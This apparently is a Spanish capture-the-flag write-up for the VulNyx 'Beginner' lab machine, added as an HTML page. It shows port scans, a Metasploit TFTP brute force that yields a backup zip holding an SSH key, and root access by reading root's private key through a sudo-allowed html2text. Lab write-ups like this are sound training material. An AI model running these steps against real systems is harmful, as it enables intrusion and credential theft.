@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">VulNyx - Beginner | noname</title>
+<meta property="og:title" content="VulNyx - Beginner | noname" />
+<meta name="twitter:title" content="VulNyx - Beginner | noname" />
+<meta itemprop="name" content="VulNyx - Beginner | noname" />
+<meta name="application-name" content="VulNyx - Beginner | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup Beginner 🟢">
+<meta itemprop="description" content="Writeup Beginner 🟢" />
+<meta property="og:description" content="Writeup Beginner 🟢" />
+<meta name="twitter:description" content="Writeup Beginner 🟢" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/nyx/beginner/" title="" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta property="og:image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/images/logo.webp" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-09-03T12:43:12&#43;0200 />
+    <meta property="article:published_time" content=2023-09-03T12:43:12&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "VulNyx - Beginner",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-09-03",
+        "description": "Writeup Beginner 🟢",
+        "wordCount":  391 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-09-03",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/images\/logo.webp"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/beginner/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+  
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">VulNyx - Beginner</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-09-03T12:43:12&#43;02:00" itemprop="datePublished"> Sep 3, 2023 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/../machines/nyx/beginner/beginner_logo.webp" alt="logo"></p>
+<ul>
+<li><em>TFTP Brute</em></li>
+<li><em>Abusing Html2text Binary</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -n -v 192.168.1.48
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,80 192.168.1.48
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
+</span></span><span class="line"><span class="cl">|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: GET POST OPTIONS HEAD
+</span></span><span class="line"><span class="cl">|_http-title: Site doesn&#39;t have a title (text/html).
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.56 (Debian)
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="escaneo-puertos-udp">Escaneo puertos UDP</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sU --top-ports 100 192.168.1.48
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE         SERVICE
+</span></span><span class="line"><span class="cl">68/udp open|filtered dhcpc
+</span></span><span class="line"><span class="cl">69/udp open|filtered tftp
+</span></span></code></pre></div><p>HTTP TCP - 80</p>
+<p><img src="/../machines/nyx/beginner/http.webp" alt="http"></p>
+<p>Al realizar fuerza bruta de <code>directorios/archivos</code> no he encontrado nada, así que abro metasploit para realizar fuerza bruta al servicio <strong>TFTP</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf6 &gt; search tftpbrute
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Modules
+</span></span><span class="line"><span class="cl">================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   #  Name                              Disclosure Date  Rank    Check  Description
+</span></span><span class="line"><span class="cl">   -  ----                              ---------------  ----    -----  -----------
+</span></span><span class="line"><span class="cl">   0  auxiliary/scanner/tftp/tftpbrute                   normal  No     TFTP Brute Forcer
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/tftp/tftpbrute
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 &gt; use 0
+</span></span><span class="line"><span class="cl">msf6 auxiliary(scanner/tftp/tftpbrute) &gt; set RHOSTS 192.168.1.48
+</span></span><span class="line"><span class="cl">RHOSTS =&gt; 192.168.1.48
+</span></span><span class="line"><span class="cl">msf6 auxiliary(scanner/tftp/tftpbrute) &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[+] Found backup-config on 192.168.1.48
+</span></span><span class="line"><span class="cl">[*] Scanned 1 of 1 hosts (100% complete)
+</span></span><span class="line"><span class="cl">[*] Auxiliary module execution completed
+</span></span></code></pre></div><p>Encuentro el archivo <code>backup-config</code> y lo descargo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ tftp 192.168.1.48
+</span></span><span class="line"><span class="cl">tftp&gt;get backup-config
+</span></span></code></pre></div><p>Con <strong>file</strong> veo que <code>backup-config</code> es un archivo zip.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ file backup-config
+</span></span><span class="line"><span class="cl">backup-config: Zip archive data, at least v1.0 to extract, compression method=store
+</span></span></code></pre></div><p>Al descomprimir el archivo zip crea una carpeta con el nombre <strong>backup</strong> y dentro contiene <code>id_rsa</code> y <code>sshd_config</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ unzip backup-config
+</span></span><span class="line"><span class="cl">Archive:  backup-config
+</span></span><span class="line"><span class="cl">   creating: backup/
+</span></span><span class="line"><span class="cl">  inflating: backup/id_rsa           
+</span></span><span class="line"><span class="cl">  inflating: backup/sshd_config 
+</span></span></code></pre></div><p>En el archivo <code>sshd_config</code> encuentro el usuario <strong>boris</strong> que es el usuario de la llave <code>id_rsa</code>.</p>
+<p><img src="/../machines/nyx/beginner/sshd_config.webp" alt="sshd_config"></p>
+<p>Me conecto al sistema mediante la llave rsa.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ssh boris@192.168.1.48 -i id_rsa
+</span></span><span class="line"><span class="cl">boris@beginner:~$ id
+</span></span><span class="line"><span class="cl">uid=1000(boris) gid=1000(boris) grupos=1000(boris)
+</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">boris@beginner:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for boris on beginner:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User boris may run the following commands on beginner:
+</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/bin/html2text
+</span></span></code></pre></div><p>Lanzo <code>html2text</code> apuntando al <code>id_rsa</code> de root y obtengo la llave rsa.</p>
+<p><img src="/../machines/nyx/beginner/id_rsa_root.webp" alt="id_rsa_root"></p>
+<p>Copio la llave a mi máquina y la arreglo para que funcione correctamente.</p>
+<p><img src="/../machines/nyx/beginner/root_rsa_fix.webp" alt="root_rsa_fix"></p>
+<p>Me conecto como root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ ssh root@192.168.1.48 -i root
+</span></span><span class="line"><span class="cl">root@beginner:~# id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) grupos=0(root)
+</span></span></code></pre></div><p>Y con esto ya tenemos resuelta la máquina Beginner.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
